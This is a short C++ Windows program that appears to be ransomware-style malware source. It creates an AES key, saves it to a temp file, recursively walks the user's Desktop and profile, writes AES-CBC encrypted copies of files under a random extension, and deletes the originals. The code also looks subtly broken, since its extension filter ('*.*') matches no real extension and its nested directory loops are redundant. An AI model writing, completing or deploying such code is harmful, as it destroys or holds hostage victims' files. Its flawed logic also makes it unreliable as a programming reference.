#include <filesystem>
#include <Windows.h>
#include <aes.h>
#include <filters.h>
#include <files.h>
#include <modes.h>
#include <osrng.h>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <cstdlib>
#include <unordered_set>
#include <algorithm> 

namespace fs = std::filesystem;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	char userProfile[MAX_PATH];
	GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH);
	fs::path path(userProfile);
	using namespace CryptoPP;
	bool anyFolderExists = false;
	std::vector<fs::path> targetFolders = {
		fs::path(userProfile) / "Desktop",
	};

	for (const auto& folder : targetFolders) {
		if (fs::exists(folder) && fs::is_directory(folder)) {
			anyFolderExists = true;
			break;
		}
	}

	if (!anyFolderExists) {
		return 1;
	}
  
	std::unordered_set<std::string> allowedExtensions = { "*.*" };

	AutoSeededRandomPool prng;
	SecByteBlock key(AES::MAX_KEYLENGTH);
	prng.GenerateBlock(key, key.size());

	fs::path keyFilePath = fs::temp_directory_path() / "key.key";

	FileSink keyFile(keyFilePath.string().c_str(), true);
	keyFile.Put(key, key.size());

	for (const auto& entry : fs::recursive_directory_iterator(targetFolders[0], fs::directory_options::skip_permission_denied)) {
		if (fs::is_regular_file(entry.path())) {

			const std::string chars = "abcdefghijklmnopqrstuvwxyz";
			std::random_device rd;
			std::mt19937 generator(rd());
			std::uniform_int_distribution<> distribution(0, chars.size() - 1);

			std::string globalExtension = ".";

			for (int i = 0; i < 4; ++i) {
				globalExtension += chars[distribution(generator)];
			}

			for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {

				std::string ext = entry.path().extension().string();
				std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

				if (allowedExtensions.count(ext) > 0) {
					std::string srcFile = entry.path().string();
					std::string encFile = srcFile + globalExtension;

					byte iv[AES::BLOCKSIZE];
					prng.GenerateBlock(iv, sizeof(iv));

					{
						FileSink* ivFileSink = new FileSink(encFile.c_str());
						ivFileSink->Put(iv, sizeof(iv));
						CBC_Mode<AES>::Encryption encryptor(key, key.size(), iv);
						FileSource fs_stream(srcFile.c_str(), true, new StreamTransformationFilter(encryptor, ivFileSink));
					}
					fs::remove(srcFile);
				}
			}
		}
	}
	return 0;
}
